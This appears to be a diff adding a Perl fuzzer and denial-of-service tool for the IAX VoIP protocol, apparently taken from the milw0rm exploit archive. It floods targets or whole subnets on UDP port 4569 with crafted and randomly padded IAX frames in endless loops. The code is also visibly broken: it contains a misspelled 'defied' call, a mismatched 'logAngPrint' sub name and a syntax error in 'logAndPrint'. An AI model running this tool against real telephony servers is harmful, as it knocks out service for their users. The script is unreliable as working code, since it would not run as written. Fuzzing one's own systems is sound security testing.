@@ -1,0 +1,510 @@
+#!/usr/bin/perl -w
+#udp IAX protocol fuzzer
+#Created: Blake Cornell
+# Exploits found with this code can be
+#  found at
+#	http://www.securityscraper.com/
+#Released under the VoIPER project
+#
+# Do not hesitate to show enthusiasm and support
+#       and help develop this further.
+
+use strict;
+use IO::Socket;
+use Getopt::Long;
+use Net::Subnets;
+use Pod::Usage;
+
+my @target_port = (4569);
+my @targets = ('127.0.0.1');
+my $result = GetOptions('port|p=i' => \(my $port = ''),
+                        'host|h=s' => \(my $host = ''),
+                        'dos' => \(my $dos = ''),
+                        'bruteforce' => \(my $bruteforce = ''),
+                        'timeout|t=i' => \(my $timeout = ''),
+                        'dust=i' => \(my $dust = ''),
+                        'listen' => \(my $listen = ''),
+                        'verbose|v' => \(my $verbose = ''),
+                        'help|?' => \(my $help = '')) or pod2usage(2);
+
+if($help) { printUsage(); }
+if($host) { @targets=@{retHosts($host)}; }
+if($port) { $target_port[0] = $port; }
+if($listen&&$dos) { print("DoS mode is in Listening Mode\n"); }
+
+for(my $i=0; $i<=$#targets;$i++) {
+	if($verbose) { print($targets[$i]."\n"); }
+        fuzzIAX($targets[$i],4569,$timeout);
+}
+exit;
+
+sub fuzzIAX {
+        my($target,$port,$timeout,@args)=@_;
+
+        if($verbose) { print("Trying $target:$port\n"); }
+
+        socket(PING, PF_INET, SOCK_DGRAM, getprotobyname("udp"));
+
+        my %iaxFrameTypes=(
+			'Nan' => "00",
+                        'DTMF' => "01",
+                        'VOICE' => "02",
+                        'VIDEO' => "03",
+                        'CONTROL' => "04",
+                        'Null' => "05",
+                        'IAXCONTROL' => "06",
+                        'TEXT' => "07",
+                        'IMAGE' => "08",
+                        'HTML' => "09",
+                        'COMFORTNOISE' => "0a",
+                        'Unknown' => "0b",
+                        'Unknown' => "0c",
+                        'Unknown' => "0d",
+                        'Unknown' => "0e",
+                        'Unknown' => "0f");
+
+        my %iaxControls=(
+			'Nan' => "00",
+                        'HANGUP' => "01",
+                        'Reserved' => "02",
+                        'RINGING' => "03",
+                        'ANSWER' => "04",
+                        'BUSY' => "05",
+                        'Reserved' => "06",
+                        'Reserved' => "07",
+                        'CONGESTION' => "08",
+                        'FLASH_HOOK' => "09",
+                        'Reserved' => "0a",
+                        'OPTION' => "0b",
+                        'KEY_RADIO' => "0c",
+                        'UNKEY_RADIO' => "0d",
+                        'CALL_PROGRESS' => "0e",
+                        'CALL_PROCEEDING' => "0f",
+                        'HOLD' => "10",
+                        'UNHOLD' => "11");
+
+        my %iaxControlFrames=(
+			'Nan' => "00",
+                        'NEW' => "01",
+                        'PING' => "02",
+                        'PONG' => "03",
+                        'ACK' => "04",
+                        'HANGUP' => "05",
+                        'REJECT' => "06",
+                        'ACCEPT' => "07",
+                        'AUTHREQ' => "08",
+                        'AUTHREP' => "09",
+                        'INVAL' => "0a",
+                        'LAGRQ' => "0b",
+                        'LAGRP' => "0c",
+                        'REGREQ' => "0d",
+                        'REGAUTH' => "0e",
+                        'REGACK' => "0f",
+                        'REGREJ' => "10",
+                        'REGREL' => "11",
+                        'VNACK' => "12",
+                        'DPREQ' => "13",
+                        'DPREP' => "14",
+                        'DIAL' => "15",
+                        'TXREQ' => "16",
+                        'TXCNT' => "17",
+                        'TXACC' => "18",
+                        'TXREADY' => "19",
+                        'TXREL' => "1a",
+                        'TXREJ' => "1b",
+                        'QUELCH' => "1c",
+                        'UNQUELCH' => "1d",
+                        'POKE' => "1e",
+                        'Reserved' => "1f",
+                        'MWI' => "20",
+                        'UNSUPPORT' => "21",
+                        'TRANSFER' => "22",
+                        'Reserved' => "23",
+                        'Reserved' => "24",
+                        'Reserved' => "25");
+
+        my %iaxHTML = (
+                        'SEND_URL' => 1,
+                        'DATA_FRAME' => 2,
+                        'BEGINNING_FRAME' => 4,
+                        'END_FRAME' => 8,
+                        'LOAD_COMPLETE' => 16,
+                        'PEER_NO_HTML' => 17,
+                        'LINK_URL' => 18,
+                        'UNLINK_URL' => 19,
+                        'REJECT_LINK_URL' => 20);
+
+        my %iaxIE = (
+                        'CALLED_NUMBER' => "01",
+                        'CALLING_NUMBER' => "02",
+                        'CALLING_ANI' => "03",
+                        'CALLING_NAME' => "04",
+                        'CALLED_CONTEXT' => "05",
+                        'USERNAME' => "06",
+                        'PASSWORD' => "07",
+                        'CAPABILITY' => "08",
+                        'FORMAT' => "09",
+                        'LANGUAGE' => "0a",
+                        'VERSION' => "0b",
+                        'ADSPICE' => "0c",
+                        'DNID' => "0d",
+                        'AUTHMETHODS' => "0e",
+                        'CHALLENGE' => "0f",
+                        'MD5_RESULT' => "10",
+                        'RSA_RESULT' => "11",
+                        'APPARENT_ADDR' => "12",
+                        'REFRESH' => "13",
+                        'DPSTATUS' => "14",
+                        'CALLNO' => "15",
+                        'CAUSE' => "16",
+                        'IAX_UNKNOWN' => "17",
+                        'MSGCOUNT' => "18",
+                        'AUTOANSWER' => "19",
+                        'MUSICONHOLD' => "1a",
+                        'TRANSFERID' => "1b",
+                        'RDNIS' => "1c",
+                        'Reserved' => "1d",
+                        'Reserved' => "1e",
+                        'DATETIME' => "1f",
+                        'Reserved' => "20",
+                        'Reserved' => "21",
+                        'Reserved' => "22",
+                        'Reserved' => "23",
+                        'Reserved' => "24",
+                        'Reserved' => "25",
+                        'CALLINGPRES' => "26",
+                        'CALLINGTON' => "27",
+                        'CALLINGTNS' => "28",
+                        'SAMPLINGRATE' => "29",
+                        'CAUSECODE' => "2a",
+                        'ENCRYPTION' => "2b",
+                        'ENCKEY' => "2c",
+                        'CODEC_PREFS' => "2d",
+                        'RR_JITTER' => "2e",
+                        'RR_LOSS' => "2f",
+                        'RR_PKTS' => "30",
+                        'RR_DELAY' => "31",
+                        'RR_DROPPED' => "32",
+                        'RR_000' => "33");
+
+        my %iaxDTMF = (
+                        '0' => 0,
+                        '1' => 1,
+                        '2' => 2,
+                        '3' => 3,
+                        '4' => 4,
+                        '5' => 5,
+                        '6' => 6,
+                        '7' => 7,
+                        '8' => 8,
+                        '9' => 9,
+                        '*' => 10,
+                        '#' => 11,
+                        'A' => 12,
+                        'B' => 13,
+                        'C' => 14,
+                        'D' => 15);
+
+        my $MAXLEN = 1024;
+        my $TIMEOUT = 1;
+        if(defined($timeout) && $timeout ne '' && $timeout != 0) { #timeout of 0 hangs
+                                                                #unanswered requests
+                $TIMEOUT=$timeout;
+        }
+
+        if($dos) {
+                if($verbose) { print("Dos attempts initiated\n"); }
+
+                my $src_call = "8000";
+                my $dst_call = "0000";
+                my $timestamp = "00000000";
+
+			#use rand sequence information to line up RE issues.
+                my $outbound_seq = unpack("H2",pack("H2",int(rand(256))));
+                my $inbound_seq = unpack("H2",pack("H2",int(rand(256))));
+			#or not
+                #my $outbound_seq = "00";
+                #my $inbound_seq = "00";
+
+		for(my $i=1; 1==1; $i++) {
+			foreach my $frame (keys(%iaxFrameTypes)) {
+			  foreach my $subset (keys(%iaxControlFrames)) {
+			    foreach my $ie (keys(%iaxIE)) {
+                                my $out_msg =   $src_call . 
+						$dst_call . 
+						$timestamp . 
+						$outbound_seq . 
+						$inbound_seq . 
+						$iaxFrameTypes{$frame} . 
+						$iaxControlFrames{$subset} . 
+						$iaxIE{$ie};
+                                if(my @args = sendUDPSocket($out_msg,$target,$port,$TIMEOUT,$listen,0)) {
+                                        if($verbose && $i%1==0) {
+                                                print('['.scalar(localtime).'] ');
+                                                print($frame.' '.$subset.' '.$ie."\n");
+                                        }
+                                }
+			    }
+			  }
+                        }
+			print "Looping\n";
+                }
+        }elsif($bruteforce) {
+                while(1) {
+                        bruteForceFUZZ($target,$port,$listen,$timeout,\%iaxFrameTypes,\%iaxControlFrames,\%iaxIE);
+                        print("\t\tLooping\n\n");
+                        sleep(5);
+                }
+        }else{ ###smart fuzz
+
+        my $src_call = "8000";
+        my $dst_call = "0000";
+        my $timestamp = "00000000";
+        my $outbound_seq = "00";
+        my $inbound_seq = "00";
+
+foreach my $frameType (keys(%iaxFrameTypes)) {
+    if($frameType eq 'CONTROL') {
+        foreach my $controlKey (keys(%iaxControls)) {
+            foreach my $ieKey (keys(%iaxIE)) {
+                my $out_msg = $src_call . $dst_call . $timestamp . $outbound_seq . $inbound_seq . $iaxFrameTypes{$frameType} . $iaxControls{$controlKey} . $iaxIE{$ieKey}."00";
+                if(my @recv = sendUDPSocket($out_msg,$target,$port,$TIMEOUT,1)) {
+                        if(defined($recv[0]) && defined($recv[1])) {
+                        	print('['.scalar(localtime).'] ');
+                        	print($recv[0].' '.$recv[1].' '.$frameType.' '.$controlKey." ".$ieKey."\n");
+			}
+			if(defined($recv[2]) && defined($out_msg) && length($recv[2]) > length($out_msg)) {
+                               	print(length($recv[2])-length($out_msg)." bytes difference\n");
+                               	print($out_msg.' '.$recv[2]."\n");
+                        }
+                }
+            }
+        }
+
+    }elsif($frameType eq 'IAXCONTROL') {
+        foreach my $frameKey (keys(%iaxControlFrames)) {
+            foreach my $ieKey (keys(%iaxIE)) {
+                my $out_msg = $src_call . $dst_call . $timestamp . $outbound_seq . $inbound_seq . $iaxFrameTypes{$frameType} . $iaxControlFrames{$frameKey} . $iaxIE{$ieKey}.'00';
+                if(my @recv = sendUDPSocket($out_msg,$target,$port,$TIMEOUT,1)) {
+                        if(defined($recv[0]) && defined($recv[1])) {
+                        	logAngPrint('['.scalar(localtime).'] ');
+                        	print($recv[0].' '.$recv[1].' '.$frameType.' '.$frameKey." ".$ieKey.' ');
+			}
+			if(defined($recv[2]) && defined($out_msg) && length($recv[2]) > length($out_msg)) {
+                               	print(length($recv[2])-length($out_msg)." bytes difference\n");
+                               	print($out_msg.' '.$recv[2]."\n");
+                        }
+                }
+            }
+        }
+    }elsif($frameType eq 'HTML') {
+        foreach my $htmlKey (keys(%iaxHTML)) {
+            foreach my $ieKey (keys(%iaxIE)) {
+                my $out_msg = $src_call . $dst_call . $timestamp . $outbound_seq . $inbound_seq . $iaxFrameTypes{$frameType} . $iaxHTML{$htmlKey} . $iaxIE{$ieKey}.'00';
+                if(my @recv = sendUDPSocket($out_msg,$target,$port,$TIMEOUT,1)) {
+                        if(defined($recv[0]) && defined($recv[1])) {
+                        	print('['.scalar(localtime).'] ');
+                        	print($recv[0].' '.$recv[1].' '.$frameType.' '.$htmlKey." ".$ieKey.' ');
+			}
+			if(defined($recv[2]) && defined($out_msg) && length($recv[2]) > length($out_msg)) {
+                               	print(length($recv[2])-length($out_msg)." bytes difference\n");
+                               	print($out_msg.' '.$recv[2]."\n");
+                        }
+                }
+            }
+        }
+
+    }elsif($frameType eq 'DTMF') {
+        foreach my $dtmfKey (keys(%iaxDTMF)) {
+            foreach my $ieKey (keys(%iaxIE)) {
+                my $out_msg = $src_call . $dst_call . $timestamp . $outbound_seq . $inbound_seq . $iaxFrameTypes{$frameType} . $iaxDTMF{$dtmfKey} . $iaxIE{$ieKey}.'00';
+                if(my @recv = sendUDPSocket($out_msg,$target,$port,$TIMEOUT,1)) {
+			if(defined($recv[0]) && defied($recv[2])) {
+                        	print('['.scalar(localtime).'] ');
+                        	print($recv[0].' '.$recv[1].' '.$frameType.' '.$dtmfKey." ".$ieKey.' ');
+			}
+           		if(defined($recv[2]) && defined($out_msg) && length($recv[2]) > length($out_msg)) {
+                               	print(length($recv[2])-length($out_msg)." bytes difference\n");
+                               	print($out_msg.' '.$recv[2]."\n");
+                        }
+                }
+            }
+        }
+    }elsif($frameType eq 'TEXT') {
+        my $out_msg = $src_call . $dst_call . $timestamp . $outbound_seq . $inbound_seq . $iaxFrameTypes{$frameType} . "00"; #text frame types "must" have a subclass of 0?
+        if(my @recv = sendUDPSocket($out_msg,$target,$port,$TIMEOUT,1)) {
+		if(defined($recv[0]) && defined($recv[1])) {
+          		print('['.scalar(localtime).'] ');
+               		print($recv[0].' '.$recv[1].' '.$frameType.' 00 ');
+		}
+	        if(defined($recv[2]) && defined($out_msg) && length($recv[2]) > length($out_msg)) {
+	        	print(length($recv[2])-length($out_msg)." bytes difference\n");
+	                print($out_msg.' '.$recv[2]."\n");
+		}
+        }
+    }else{
+        foreach my $frameKey (keys(%iaxControlFrames)) {
+            foreach my $ieKey (keys(%iaxIE)) {
+                my $out_msg = $src_call . $dst_call . $timestamp . $outbound_seq . $inbound_seq . $iaxFrameTypes{$frameType} . $iaxControlFrames{$frameKey} . $iaxIE{$ieKey}.'00';
+                if(my @recv = sendUDPSocket($out_msg,$target,$port,$TIMEOUT,1)) {
+			if(defined($recv[0]) && defined($recv[1])) {
+                        	print('['.scalar(localtime).'] ');
+                        	print($recv[0].' '.$recv[1].' '.$frameType.' '.$frameKey." ".$ieKey.' ');
+			}
+                        if(defined($recv[2]) && defined($out_msg) && length($recv[2]) > length($out_msg)) {
+                                print(length($recv[2])-length($out_msg)." bytes difference\n");
+                                print($out_msg.' '.$recv[2]."\n");
+                        }
+                }
+            }
+        }
+      }
+    }
+  }
+}
+
+sub sendUDPSocket {
+        my($msg,$target,$port,$timeout,$listen,@args)=@_;
+
+        my $MAXLEN=1024;
+
+                #my($respaddr,$port);
+                my $out_msg = pack("H*",$msg);
+                my $ipaddr = inet_aton($target);
+                my $sin = sockaddr_in($port,$ipaddr);
+                send(PING, $out_msg, 0, $sin) == length($out_msg) or die "cannot send to $target : $port : $!\n";
+
+        if($listen) {
+		#sleep(.005);
+                eval {
+                        local $SIG{ALRM} = sub { die "alarm time out"; };
+                        alarm $timeout;
+                        #alarm $timeout;
+                        while (1) {
+                                my $recvfrom = recv(PING, my $in_msg, $MAXLEN, 0) or die "recv: $!";
+                                ($port, $ipaddr) = sockaddr_in($recvfrom);
+                                my $respaddr = inet_ntoa($ipaddr);
+                                if($verbose) {
+					displayIAXRaw($respaddr,$port,$respaddr,$out_msg,$in_msg);
+                                }
+                                return($respaddr,$port,unpack("H*",$in_msg));
+                        }
+                };
+                return 0;
+        }
+}
+
+sub bruteForceFUZZ {
+        my($target,$port,$listen,$timeout,$refFrameTypes,$refControlFrames,$refIE,@args)=@_;
+
+                my %iaxFrameTypes=%{$refFrameTypes};
+                my %iaxControlFrames=%{$refControlFrames};
+                my %iaxIE=%{$refIE};
+
+                for(my $a=32768;$a<=32768;$a++) {# Full Packet 4byte
+                 for(my $b=0;$b<=0;$b++) {# Dest Call 4byte
+                  for(my $c=0;$c<=0;$c++) {# Timestamp 8byte
+                   #for(my $d=0;$d<=0;$d++) {# Out Seq # 2byte
+		   my $loopD=1;
+                   #for(my $d=unpack("H2",pack("H2",int(rand(256))));$loopD;$d++) {# Out Seq # 2byte
+		   #	$loopD=0;
+
+                my $outbound_seq = unpack("H2",pack("H2",int(rand(256))));
+                my $inbound_seq = unpack("H2",pack("H2",int(rand(256))));
+
+
+                    #if($verbose) {print(sprintf("%04x",$a)." ".sprintf("%04x",$b)." ".sprintf("%08x",$c)." ".sprintf("%02x",$d)."\n"); }
+		    for(my $d=0;1;$d++) {
+                     for(my $e=0;1;$e++) {# In Seq # 2byte
+                      foreach my $frameType (keys(%iaxFrameTypes)) {
+                       foreach my $frameKey (keys(%iaxControlFrames)) {
+                        foreach my $ie (keys(%iaxIE)) {
+                         for(my $f=0;$f<=0;$f++) {
+			  my $maxDust=10;
+			  if($listen) { $maxDust/=2; }
+			  if(defined($dust) && length($dust) > 0) { $maxDust=$dust; }
+                          for(my $z=1;$z<=$maxDust;$z++) {
+			    my $len = int(rand(9));
+			    my $box= int(rand("9"x(($len+1))));
+			      for(my $zz=1;$zz<=$maxDust;$zz++) {	
+				my $hex_msg = sprintf("%04x",$a).sprintf("%04x",$b).sprintf("%08x",$c).sprintf("%02x",$d).sprintf("%02x",$e). $iaxFrameTypes{$frameType} . $iaxControlFrames{$frameKey} . $iaxIE{$ie} . sprintf("%02x",$f) . sprintf("%0".$len."x",$box);
+                                if($verbose) {print("[" . scalar(localtime) . "] '" . $frameType."_".$frameKey."_".$ie."_".sprintf("%02x",$f)."_".sprintf("%0".$len."x",$box)."'\n"); }
+				foreach my $var (sendUDPSocket($hex_msg,$target,$port,1,$listen)) { if($verbose) { print($var."_"); } }
+			      }
+		}}}}}}}}}}  #<------ VERY IMPORTANT
+}
+
+sub retIAXHostActive {
+        my($target,$port,@args)=@_;
+        my $out_msg='';
+        if(my @recv = sendUDPSocket($out_msg,$target,$port,1,1)) {
+                return 1;
+        }
+        return 0;
+}
+
+sub retHosts {
+        my($host,@args)=@_;
+        my @addrs;
+
+        if(!$host) { return ('127.0.0.1') };
+
+        if($host =~ /^([\d]{1,3}).([\d]{1,3}).([\d]{1,3}).([\d]{1,3})\/([\d]{1,2})$/ && $1 >= 0 && $1 <= 255 && $2 >= 0 && $2 <= 255 && $3 >= 0 && $3 <= 255 && $4 >= 0 && $4 <= 255) {
+                                        #Check to see if host is valid class C CIDR Address
+                if($verbose) { print("Setting CIDR Address Range\n"); }
+                my $sn = Net::Subnets->new;
+
+                my($low,$high)=$sn->range(\$host);
+                if($verbose) { print("Determined IP Ranges From $$low - $$high\n"); }
+                return \@{ $sn->list(\($$low,$$high)) };
+        }elsif($host =~ /^([\d]{1,3}).([\d]{1,3}).([\d]{1,3}).([\d]{1,3})$/ && $1 >= 0 && $1 <= 255 && $2 >= 0 && $2 <= 255 && $3 >= 0 && $3 <= 255 && $4 >= 0 && $4 <= 255)  {
+                                        #Check to see if host is valid IP
+                push(@addrs,"$1.$2.$3.$4");
+        }else{
+                push(@addrs,$host);
+        }
+        return \@addrs;
+}
+
+sub displayIAXRaw {
+	my($respaddr,$port,$out_msg,$in_msg)=@_;
+
+	if(defined($in_msg) && unpack("H*",$in_msg) ne '80000000000000000000060a') {
+	        print("[" . scalar(localtime) . "] $respaddr:$port\t$respaddr\t" . unpack("H*",$out_msg) . "\t". unpack("H*",$in_msg) . "\n");
+	}elsif(defined($respaddr) && defined($port)) {
+	        print(scalar(localtime) . " $respaddr:$port\t$respaddr\n");
+
+	}
+}
+
+sub displayIAXPacket {
+        my($hex_msg,@args)=@_;
+
+        my $width=32/8;
+
+        for(my $i=0;$i*$width<=length($hex_msg);$i++) {
+                print(substr($hex_msg,$i*$width,$width)."\n");
+        }
+        #print $hex_msg."\n";
+}
+
+sub printUsage {
+        print "$0 --dos\n\t\tWill loop through known or manually preset packet combinations.\n";
+        print "$0 --bruteforce\n\t\tBrute force fuzzes on default port of 4569.  It will try random data packaging at the end of a valid packet.  It will by default send 10 per each packet.\n";
+        print "$0 -h 127.0.0.1 --bruteforce --dust 1\n\t\tBrute force fuzzes on default port of 4569.  It will try random data packaging at the end of a valid packet.  It will only send 1 of each packet.\n";
+        print "$0 \n\t\tScans the loopback interface by rough usage from IETF guidelines.\n";
+        exit;
+}
+
+sub logAndPrint {
+	my($string,@args)=@);
+	
+	if(1==1 || defined($string)) {
+		print $string;
+		open(FLE,">>$0_logs_[".scalar(localtime)."] $string");
+		print FLE $string;
+		close(FLE);
+	}
+}
+
+# milw0rm.com [2009-06-12]
